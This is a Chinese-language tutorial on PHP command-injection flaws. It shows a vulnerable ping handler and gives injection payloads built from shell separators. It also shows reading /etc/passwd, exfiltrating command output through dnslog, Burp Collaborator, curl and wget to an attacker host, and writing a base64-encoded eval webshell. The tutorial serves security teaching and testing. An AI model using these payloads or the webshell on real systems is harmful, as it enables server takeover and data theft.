## 0x00 命令执行漏洞描述
程序员在使用脚本语言（如php）开发应用程序的过程中，虽然十分方便快捷，但是也存在一些问题，比如速度慢，无法接触底层系统等，尤其是在一些企业级应用中需要去调用一些外部程序，此时就要用到一些执行系统命令的函数。  
应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，没有任何检查和过滤的情况下，就会造成命令执行漏洞。  

## 0x01 常见命令执行的相关函数
在 PHP 中可以调用外部程序的常见函数：  

system(args) 有回显
passthru(args)(有回显)
exec(args) （回显最后一行-必须 echo 输出）
shell_exec(args) （无回显-必须输出）
popen(handle,mode)(无回显)
proc_open('cmd','flag','flag')（无回显）
$process = proc_open('dir',$des,$pipes);
echo stream_get_contents($pipes[1]);
反引号 ： ``

## 0x02 命令执行漏洞的危害
1. 接管Web应用程序，控制整个网站；
2. 执行系统命令，读写文件，反弹shell，控制接管整个服务器；

## 0x03 命令执行漏洞代码分析
从代码中，ipaddress 参数是外部可以控制的，经过 explode 拆分，再判断类型，再使用 shell_exec 函数调用系统命令，所以存在命令执行漏洞。  
```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
    if(stristr(php_uname('s'),'windows')){
        $result.=shell_exec('ping '.$ip);
    }else{
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}

```

## 0x04 命令执行漏洞攻击
### 1.分号 ；
在命令行中，命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其他命令的执行。  
```bash
ping -c 4 127.0.0.1;whoami
```
以上述命令为例，当ping执行失败时，也不会影响whoami正常执行。

### 2.管道符号 | 
通过管道符，可以将一个命令的标准输出管理为另外一个命令的标准输入，当他失败后，会执行另外一条命令。  
```bash
ping -c 4 127.0.0.1 | whoami
```

### 3.后台任务符号 & 
此符号的作用是使shell在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作。  
```bash
ping -c 4 127.0.0.1&cat /etc/passwd&
```

### 4.逻辑与 && 
前面的命令和后面的命令执行之间存在逻辑与关系，只有前面的命令执行成功后，它后面的命令才会被执行。
```bash
ping -c 4 127.0.0.1 && whoami
```

### 5.逻辑或 || 
前后命令的执行存在逻辑或关系，，只有前面命令执行失败后，它后面的命令才会被执行。  
```bash
ping -c  && whoami
```

### 6.反引号 ``
当一个命令被解析时，它首先会执行反引号之间的操作。例如执行 echo \`ls -a\` 将会首先执行 ls 并捕获其输出信息。然后再将它传递给 echo，并将 ls 的输出结果打印在屏幕上，这被称为命令替换。
```bash
echo `whoami`
```

### 7.命令执行 $(command)
这是命令替换的不同符号。当反引号被过滤或编码时，这个命令可能会更有效。
```bash
moonsec@moonsec:~$ ping -c 4 127.0.0.1$(whoami)
PING 127.0.0.1moonsec (127.0.0.2) 56(84) bytes of data.
64 bytes from 127.0.0.2: icmp_seq=1 ttl=64 time=0.010 ms
64 bytes from 127.0.0.2: icmp_seq=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.2: icmp_seq=3 ttl=64 time=0.105 ms
64 bytes from 127.0.0.2: icmp_seq=4 ttl=64 time=0.061 ms

--- 127.0.0.1moonsec ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3040ms
rtt min/avg/max/mdev = 0.010/0.051/0.105/0.036 ms
```

### 8.win命令链接符
其中 | || & && 和Linux系统下是一致的。如果发现命令执行漏洞并且可以回显，直接获取系统敏感信息。
win 操作系统
type c:\windows\win.ini
linux 操作系统
cat /etc/passwd

## 0x04 命令执行漏洞带外通信技巧

上述漏洞利用方式为有回显利用，但是在实战环境中有回显的情况相对较少，无回显环境居多，证明漏洞存在就需要各种利用带外通信技巧。  
带外通信技巧一般都是无回显的情况下使用，首先可以利用dnslog。

### 1.DNSlog
dnslog 是一个显示解析记录的平台，在无回显的情况下，通过访问 dnslog，dnslog 会把你访问的子域名的头文件记录下来。
使用反引号\`whoami\`得到用户名，再拼接DNSlog子域名，再使用 icmp 协议访问，就是 ping 该域名。
payload如下：  
```bash
ping -c 4 127.0.0.1| ping `whoami`.3el05z.dnslog.cn

```
如果存在漏洞的情况下，getsubdomin就会得到回显信息。在 DNS Query Record 中，会记录 moonsec.3el05z.dnslog.cn。

### 2.burpsuite burpcollaborator
测试原理和DNSlog一样，使用 burpsuite 的 burpcollaborator 点击复制（copy to clipboard），复制测试的子域名，然后再与我们想要回显的信息拼接，payload如下：  
```bash
ping -c 4 127.0.0.1| ping `whoami`.xlmiw1sf16svvsbtwr5upgac137tvi.burpcollaborator.net
```
Poll now 是刷新频率，如果有访问记录，会自动把请求记录下来，这时候就能看到回显的字符。

## 0x05 利用日志测试无回显命令执行漏洞

HTTP协议在访问Web中间件时，IIS、Apache或者其他小型服务，都存在并记录访问日志。
在kali上开启python的小型服务器，利用curl协议执行命令，访问这个kali服务器的80端口，就可以在终端上查看到访问记录。
### 1.curl
使用curl命令，payload如下：  
```bash
ping -c 4 ||curl http://192.168.0.133/?`whoami`
```
curl是一个用于在命令行中传输数据的工具，尤其是在网络环境下进行HTTP请求。其全程是client url 支持多种协议，包括HTTP、HTTPS、FTP等。curl常用于发送请求、获取服务器响应，甚至可以上传和下载文件。
### 2.wget
使用wget命令，payload如下：  
```bash
ping -c 4 ||wget http://192.168.0.133/?`whoami`
```
wget 是一个命令行工具，用于从网络上下载文件， 全称是 "Web Get"，其支持多种协议。

## 0x06 利用命令执行漏洞管道符号写入Webshell
如果存在命令执行漏洞的页面有Web服务器，且有写入权限，利用shell命令写入Webshell后门到网站目录下，访问即可获取Webshell。
payload如下：
```bash
echo "PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg=="|base64 -d >shell.php

cat shell.php

<?php phpinfo();eval($_POST['cmd'])?>
```

## 0x07 利用Netcat进行命令执行漏洞无回显测试
